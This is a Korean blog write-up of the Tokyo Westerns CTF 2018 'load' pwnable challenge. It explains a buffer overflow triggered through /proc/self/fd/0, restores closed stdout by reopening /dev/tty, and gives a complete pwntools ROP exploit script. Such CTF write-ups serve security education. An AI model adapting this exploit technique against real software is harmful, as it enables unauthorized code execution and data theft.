+++
title = "Tokyo Westerns CTF 2018 - load"
date = "2024-07-10"
description = "Tokyo Westerns CTF 2018 pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "file descriptor", "/dev/tty"]
+++
## 0x00. Introduction

``` bash
[*] '/home/user/load'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
```

## 0x01. Vulnerability

``` c
int __fastcall load_file_4008FD(void *buf, const char *file_name, __off_t offset, size_t size)
{
  int fd; // [rsp+2Ch] [rbp-4h]

  fd = open(file_name, 0);
  if ( fd == -1 )
    return puts("You can't read this file...");
  lseek(fd, offset, 0);
  if ( read(fd, buf, size) > 0 )
    puts("Load file complete!");
  return close(fd);
}
```

`load_file_4008FD()`를 보면 입력받은 파일명을 `open`해서 내용을 `size`만큼 읽은 후 `main()`의 `buf` 변수에 써준다.

이 때 `file_name`을 `/proc/self/fd/0`으로 조작해준다면, 파일의 내용을 읽는 것이 아닌 `stdin`을 읽어서 `buf`에 쓰는 꼴이 된다.

``` c
  char buf[32]; // [rsp+0h] [rbp-30h] BYREF
  size_t size; // [rsp+20h] [rbp-10h]
  __off_t offset; // [rsp+28h] [rbp-8h]
```

`main()`의 `buf`는 `rbp-0x30`에 위치해있고 원하는 만큼 `size`를 입력할 수 있으니 BOF 취약점이 발생한다.

## 0x02. Exploit

BOF 취약점이 있으니 libc leak을 하려고 했는데 PLT가 있는 `puts()`든 `_printf_chk()`든 이상하게 출력이 안됐다.

그래서 디버깅을 해보니 `puts()`의 리턴 값이 `-1`인 것을 확인했고, 뭔가 에러가 발생했음을 알았다.

언제 이런 에러가 발생하는지 찾아보다가 `stdout`에 문제가 생기면 그럴 수 있다는 정보를 찾아서 확인해보니...

``` c
int close_4008D8()
{
  close(0);
  close(1);
  return close(2);
}
```

`load_file_4008FD()`이 끝난 후 `main()`이 종료되기 전에 `close_4008D8()`라는 함수가 호출되는데, 여기에서 `stdout`을 close해버린다.

그래서 구글링을 열심히 해보니 `/dev/tty`를 `open`하면 다시 `stdout`을 살릴 수 있다는 것을 알았다.

문제는 `/dev/tty`를 어디에 넣어놓고 `open()`에 전달할 것이냐인데, BOF 취약점을 트리거하기 위해 `file_name`에 `/proc/self/fd/0`을 넣는 과정에서 `\x00`을 하나 추가하고 `/dev/tty`를 전달하면 될 것 같았다.

``` python
    # open("/dev/tty", O_RDWR | O_CREAT)
    payload_open = p64(ppr)
    payload_open += p64(66)                     # pop rsi
    payload_open += p64(0)                      # pop r15
    payload_open += p64(pr)
    payload_open += p64(bp['file_name'] + 0x10) # pop rdi
    payload_open += p64(elf.plt['open'])
```

위 payload를 ROP chain에 3번 넣어서 `/proc/self/fd/`에 순서대로 0, 1, 2가 생성되는 것을 확인했다.

이렇게 leak을 하는데에는 성공했으나 `stdin`을 살렸음에도 다음 playoad를 전송하는 것에 실패했다.

그래서 고민이 됐던게 leak을 해봤자 다음 입력을 줄 수가 없으므로 한번에 입력을 줘서 flag를 `open` -> `read` -> `write`를 다 시켜야하는데 `rdx` 관련 가젯이 없다.

그러면 `read`의 세 번째 인자인 `size` 컨트롤이 불가능하기 때문에 `open("flag", 'r');`을 한 이후의 `rdx` 값이 내용을 읽어오기에 충분히 큰 값이기를 기도해야하는데...

실제로 확인해보니 `open`이 종료되고 난 `rdx` 값이 0이었다.

어떻게 출력을 할지 한참을 고민하다가...

``` c
  load_file_4008FD(buf, byte_601040, offset, size);
```

마침 동일한 로직을 수행하는 함수가 코드 영역에 있었다!

-   `rdi` : pop rdi; ret; 가젯 활용, free space인 byte_601040
-   `rsi` : pop rsi; pop r15; ret; 가젯 활용, BOF 트리거 할 때 넣은 "flag" 위치
-   `rdx` : open 종료 후 0
-   `rcx` : open 종료 후 0x00007ffff7e9e53b (충분히 큰 값)

이런식으로 레지스터를 컨트롤해주면 `flag`를 출력할 수 있었다.

## 0x03. Payload

``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
import sys

DEBUG = True
BINARY = "load"
LIBRARY = "libc.so.6"

pr = 0x0000000000400a73
ppr = 0x0000000000400a71
bp = {
    'read_of_load_file' : 0x400966,
    'main' : 0x400817,
    'end_of_main' : 0x4008A8,
    'close' : 0x4008D8,
    'read_str' : 0x400986,
    'file_name' : 0x601040,
    'load_file' : 0x4008FD,
}

gs = f'''
continue
'''
context.terminal = ['tmux', 'splitw', '-hf']

def send_msg(s, msg):
    print(s.recvuntil(b": "))
    s.sendline(msg.encode())

def main():
    if(len(sys.argv) > 1):
        s = process(BINARY)
    else:
        s = process(BINARY)
        if DEBUG:
            gdb.attach(s, gs)
    elf = ELF(BINARY)
    lib = ELF(LIBRARY)

    send_msg(s, "/proc/self/fd/0\x00/dev/tty\x00flag\x00")
    send_msg(s, "0")
    send_msg(s, "1024")

    payload = b"A" * 0x30
    payload += b"B" * 8

    # open("/dev/tty", O_RDWR | O_CREAT)
    payload_open = p64(ppr)
    payload_open += p64(66)                     # pop rsi
    payload_open += p64(0)                      # pop r15
    payload_open += p64(pr)
    payload_open += p64(bp['file_name'] + 0x10) # pop rdi
    payload_open += p64(elf.plt['open'])

    # open 3 times -> open 0, 1, 2
    payload += payload_open * 3

    # load_file_4008FD(byte_601040, "flag", offset, size)
    payload += p64(ppr)
    payload += p64(bp['file_name'] + 0x19)      # pop rsi
    payload += p64(0)                           # pop r15
    payload += p64(pr)
    payload += p64(bp['file_name'])             # pop rdi
    payload += p64(bp['load_file'])

    # puts(byte_601040)
    payload += p64(pr)
    payload += p64(bp['file_name'])             # pop rdi
    payload += p64(elf.plt['puts'])

    log.info(f"payload length : {hex(len(payload))}")
    s.sendline(payload)
    pause()
    print(s.recv().split(b"\n")[2])

if __name__=='__main__':
    main()
```
